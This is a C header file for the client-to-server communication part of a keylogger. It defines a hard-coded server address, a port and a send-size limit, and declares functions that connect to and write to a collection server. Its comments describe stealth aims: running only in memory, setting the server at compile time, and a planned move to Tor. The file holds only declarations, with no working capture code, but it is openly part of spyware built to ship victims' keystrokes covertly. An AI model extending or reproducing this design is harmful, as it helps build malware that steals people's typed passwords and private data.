#ifndef KEYLOGGER_CLIENTCOM_H_INCLUDED
#define KEYLOGGER_CLIENTCOM_H_INCLUDED
/*
    define all structures necessary for the server connection,
    ip address, port, etc. i chose to hard code this information as a
    contrast to the alternative of doing a config file,
    eventually this software should live only in memory, this will enable
    further stealth options,

    the ip address should be configured by the server during compile time,
    a script will eventually be included to configure the server via a compile
    script.

    NOTE: future updates will likly include communication over the tor v.3 network
*/
#define IP_ADDRESS "127.0.0.1"
#define SERVER_CONNECTION_PORT 8080

/*
    this is the max length in bytes to send at a time,
    the server will reject any data beyond this capacity
    processes that are captured and contain more then the allocated
    data will be sent in multiple passes.
*/
#define MAXSENDDATA 4096
bool startListeningClient();
bool ReadFromServer();
bool WriteToServer(const char* buffer);

#endif // KEYLOGGER_CLIENTCOMUNICATION_H_INCLUDED
